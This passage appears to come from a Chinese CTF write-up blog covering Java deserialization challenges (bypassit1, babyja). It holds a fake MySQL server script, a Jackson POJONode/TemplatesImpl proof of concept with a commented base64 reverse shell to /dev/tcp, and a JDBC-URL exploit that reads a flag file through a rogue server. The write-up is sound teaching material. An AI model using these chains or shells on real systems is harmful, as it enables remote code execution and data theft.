class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里话最后使用别的端口号，因为3306是默认被使用的mysql端口</p><p>这就是等会得在自己的服务器上开启的<code>fake mysql server</code>  </p><p><img src="../images/image-20230526154239087.png" alt="image-20230526154239087"></p><p>注意把生成的payload和mysql.py放在同一个文件下面   这样vps上的”mysql服务”就会把payload发回被攻击服务器。</p><p>另一个终端监听刚刚反弹shell时设置的端口</p><p><img src="../images/image-20230526160149558.png" alt="image-20230526160149558"></p><p><img src="../images/image-20230526160247086.png" alt="image-20230526160247086"></p><p>然后bp发包</p><p><img src="../images/image-20230526160325156.png" alt="image-20230526160325156"></p><p>用这个cookie进行反序列化</p><p>然后bp传参</p><p><img src="../images/image-20230526160927044.png" alt="image-20230526160927044"></p><p><img src="../images/image-20230526160932661.png" alt="image-20230526160932661"></p><p>然后就可以弹到shell了，不过这里的话很快就没了</p><p><strong>可以用curl外带也行</strong>(这里我就不尝试了)</p><h2 id="bypassit1-阿里云ctf2023"><a href="#bypassit1-阿里云ctf2023" class="headerlink" title="bypassit1(阿里云ctf2023)"></a>bypassit1(阿里云ctf2023)</h2><p><a href="https://xz.aliyun.com/t/12509">从bypassit1了解POJONode#toString调用getter方法原理</a></p><p><a href="https://godspeedcurry.github.io/posts/aliyunctf2023-bypassit1/">aliyunctf2023-bypassit1</a></p><p><a href="https://boogipop.com/2023/04/24/AliyunCTF%202023%20WriteUP/#bypassit1">bypassit</a></p><p>上面是参考文章</p><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>前面说到了在fastjson中的原生的一个反序列化调用任意类的getter方法的原理与细节</p><p>从最开始的fastjson &lt; 1.2.48下的在<code>JSONObject / JSONArray</code>类反序列化过程没有安全检查的情况下通过<code>BadAttributeValueExpException#readObject</code>调用<code>JSONObject#toString / JSONArray#toString</code>方法也即是<code>JSON#toString</code>方法触发getter</p><p>再到fastjson &gt;= 1.2.48下的存在有<code>SecureObjectInputStream</code>的安全检查的情况下，通过使用<code>HashMap</code>等等类创建一个<code>reference</code>的方式绕过resolveClass的检查触发getter</p><p>既然在fastjson中存在有这样的原生反序列化，在另一个和他功能类似的开源库jackson也有着类似的原生反序列化触发getter方法</p><p>(这里的考点就是<code>jackson</code>触发getter方法和<code>fastjson</code>一样)</p><h4 id="jackson"><a href="#jackson" class="headerlink" title="jackson"></a>jackson</h4><p>这里直接写个demo进行分析</p><p><img src="../images/image-20230531200815422.png" alt="image-20230531200815422"></p><p>直接就是使用<code>writeValueAsString</code>这个方法来调用这个getter方法</p><p>这里就不跟进去分析了 </p><p>然后知道了这里是和<code>fastjson</code>一样的利用方法，就是触发getter，那么我们就刚好可以想到一个类可以通过触发getter来执行恶意代码   <code>TemplatesImpl</code></p><p><img src="../images/image-20230531202513992.png" alt="image-20230531202513992"></p><p>就是会经过一系列的getter调用,最后就是会到这里进行<strong>初始化</strong>(这里的话cc4这条链子有分析这个类的使用)</p><p>这里话就是找谁的<strong>toString</strong>方法能触发这个类     因为<code>fastjson</code>就是靠这个来进行触发的</p><p>然后我们就找哪个类能调用到这个<code>tostring</code>方法  这里的话如果对cc链熟悉的话，就马上可以猜到是<code>BadAttributeValueExpException</code>这个类</p><p><img src="../images/image-20230531202402003.png" alt="image-20230531202402003"></p><p>那么利用链就构造完成了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">③TemplatesImpl#getOutputProperties</span><br><span class="line">②jacksonType#toString</span><br><span class="line">①BadAttributeValueExpException触发val的toString方法</span><br></pre></td></tr></table></figure><p>这个触发tostring的方法必须是<code>jacksontype</code>的,而且还必须的得能触发到这个<code>writeValueAsString</code>方法，并且还能给这个方法赋值为<code>TemplatesImpl</code>的对象</p><p>(这里的不知道大佬是怎么发现的，这里就知道咋利用就行了)</p><p>刚好能发现<code>POJONode</code>这个类可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">③TemplatesImpl#getOutputProperties</span><br><span class="line">②POJONode#toString</span><br><span class="line">①BadAttributeValueExpException触发val的toString方法</span><br></pre></td></tr></table></figure><p>POC</p><p><strong>App.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ctf.bypassit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ArrayNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.BaseJsonNode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.ValueNode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpHeaders;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URI;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Hello world!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        <span class="comment">//constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNzc3NyAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;);</span></span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是固定写法   生成字节码</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;boogipop&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是对字节码的初始化和实例化</span></span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是BadAttributeValueExpException触发POJONode的toString方法</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//上面是序列化和反序列化</span></span><br><span class="line"><span class="comment">//        doPOST(exp.toString().getBytes());</span></span><br><span class="line"><span class="comment">//        byte[] byt=new byte[fileInputStream.available()];</span></span><br><span class="line"><span class="comment">//        fileInputStream.read(byt);</span></span><br><span class="line"><span class="comment">//        doPOST(byt);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doPOST</span><span class="params">(<span class="type">byte</span>[] obj)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HttpHeaders</span> <span class="variable">requestHeaders</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">        requestHeaders.set(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/plain&quot;</span>);</span><br><span class="line">        <span class="type">URI</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(<span class="string">&quot;http://192.168.142.129:8080/bypassit&quot;</span>);</span><br><span class="line">        <span class="comment">//URI url = new URI(&quot;http://localhost:8080/bypassit&quot;);</span></span><br><span class="line">        HttpEntity&lt;<span class="type">byte</span>[]&gt; requestEntity = <span class="keyword">new</span> <span class="title class_">HttpEntity</span> &lt;&gt; (obj,requestHeaders);</span><br><span class="line"></span><br><span class="line">        <span class="type">RestTemplate</span> <span class="variable">restTemplate</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);</span><br><span class="line">        System.out.println(res.getBody());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        <span class="comment">//Field writeReplaceMethod = ObjectStreamClass.class.getDeclaredField(&quot;writeReplaceMethod&quot;);</span></span><br><span class="line">        <span class="comment">//writeReplaceMethod.setAccessible(true);</span></span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="POJONode-toString"><a href="#POJONode-toString" class="headerlink" title="POJONode#toString"></a>POJONode#toString</h4><p>这里话讲讲为什么这个类能触发<code>tostring</code>方法</p><p>这个类是没有<code>tostring</code>方法的，但是他继承了<code>ValueNode</code>这个类   然后<code>ValueNode</code>这个类继承了<code>BaseJsonNode</code></p><p><img src="../images/image-20230531205204153.png" alt="image-20230531205204153"></p><p><img src="../images/image-20230531205220935.png" alt="image-20230531205220935"></p><p>这里的不直接使用<code>BaseJsonNode</code>或者<code>ValueNode</code>这两个类的原因是因为这两个类是抽象类，不能进行实例化   所以就只能选他们的子类<code>POJONode</code></p><p>(虽然子类没有这个方法，但是执行代码的时候会向上查找，然后就会在他的父类这里找到这个<strong>tostring</strong>方法)</p><p>但是这<code>BaseJsonNode</code>这个类是有问题的，得进行重写</p><p><img src="../images/image-20230531205550223.png" alt="image-20230531205550223"></p><p><strong>原因</strong> </p><p>根据报错定位到<code>ObjectOuptputStream#writeObject0</code>中</p><p><img src="../images/image-20230531205923600.png" alt="image-20230531205923600"></p><p>如果序列化的类实现了<code>writeReplace</code>方法，将会在序列化过程中调用它进行检查，好巧不巧，在<code>POJONode</code>的父类<code>BaseJsonNode</code>中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断</p><h2 id="babyja-2023黑盾杯"><a href="#babyja-2023黑盾杯" class="headerlink" title="babyja(2023黑盾杯)"></a>babyja(2023黑盾杯)</h2><p>还是先对jar包进行分析</p><p>先看下pom.xml</p><p><img src="../images/image-20230612143657055.png" alt="image-20230612143657055"></p><p>得到这4个东西，可以猜测是用<code>fastjson</code>去打<code>jdbc</code>反序列化了</p><p><img src="../images/image-20230612143754850.png" alt="image-20230612143754850"></p><p>然后看了下入口点，发现猜想并没有错，就是使用fastjson来打</p><p><img src="../images/image-20230612144030874.png" alt="image-20230612144030874"></p><p>在结合这里的jdbc,发现我们的刚开始的猜想是正确的</p><p>但是这里有个问题就是<code>JSON.parse()</code>是只会触发setter方法，但不会触发道    <code>getter</code>方法，所以前面的依赖就用到了   </p><p><img src="../images/image-20230612144225930.png" alt="image-20230612144225930"></p><p>这个依赖可以任意触发<code>getter</code>方法  —&gt;  <a href="https://ke1nys.github.io/posts/7d138d32.html">vaadin</a></p><p><img src="../images/image-20230612144309597.png" alt="image-20230612144309597"></p><p>但是看到过滤函数的时候，把触发fastjson的函数全给ban了</p><p>这里的话又得用到另一个依赖了</p><p><img src="../images/image-20230612144402015.png" alt="image-20230612144402015"></p><p>我们可以使用 <strong>c3p0</strong>的二次反序列化方法来进行绕过(<code>hex base</code>)</p><p><strong>那么基本的构造链就完成了</strong></p><p><strong>用<code>c3p0</code>的二次反序列化来绕过过滤，然后<code>fastsjon</code>来执行<code>setter</code>进行赋值，然后<code>com.vaadin</code>来触发getter来触发<code>jdbc</code>的反序列化链子</strong></p><p><strong>EXP</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ctf.bean.MyBean;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.NestedMethodProperty;</span><br><span class="line"><span class="keyword">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Hex;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span>  <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">MyBean</span> <span class="variable">myBean</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">MyBean</span>();</span><br><span class="line">        myBean.setDatabase(<span class="string">&quot;mysql://vps:3306/test?user=fileread_file:///flag.txt&amp;ALLOWLOADLOCALINFILE=true&amp;maxAllowedPacket=655360&amp;allowUrlInLocalInfile=true#&quot;</span>);</span><br><span class="line"><span class="comment">//下面是为了使用getPropertyId()方法触发getValue()来调用invoke触发任意getter</span></span><br><span class="line">        <span class="type">PropertysetItem</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 